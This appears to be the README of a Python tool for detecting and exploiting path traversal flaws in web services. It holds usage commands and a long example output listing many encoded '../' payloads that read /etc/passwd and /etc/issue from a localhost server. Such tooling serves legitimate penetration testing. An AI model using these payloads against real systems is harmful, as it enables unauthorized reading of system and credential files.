dotdotfarm
==========
Utility for detection & exploitation of Path Traversal vulnerabilities in various network services

dotdotweb - PT tool for web services (HTTP) (Alpha version)

Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make **~3K requests per second**

Installation
============
```bash
git clone https://github.com/treddis/dotdotfarm
cd dotdotfarm
pip install -r requirements.txt
python setup.py
```

How to use
=====
Passing in GET parameters
----------------------
Passing brute parameters via `?par=val` pairs:
```bash
dotdotweb -o windows http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
```

Passing via headers
-------------------
Passing brute parameters via `Origin: master=FUZZ` pairs:
```bash
dotdotweb -o linux -H "Referer: https://www.google.com/path?q=FUZZ" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

Passing via POST data
---------------------
Passing brute parameters via POST data parameters
```bash
dotdotweb -o linux -H "key0=val0&key1=val1" http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

Example output
==============
```bash
dotdotweb -o linux "http://localhost:8080/pathtrav?query=FUZZ" 
[*] Started at Mon Jan 16 00:00:44 2023
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fpasswd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/passwd                                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../../etc/passwd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/passwd                                 [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fpasswd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../etc/passwd                                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fpasswd                                     [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fpasswd                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/passwd                                             [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                         [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/issue                                              [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../etc/issue                                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../../../etc/issue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/issue                                  [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/issue                                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fissue                                      [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fissue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fissue                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fissue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                          [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                 [Status: 200, Size: 56]
[*] Ended at Mon Jan 16 00:00:54 2023 (9 seconds)
```
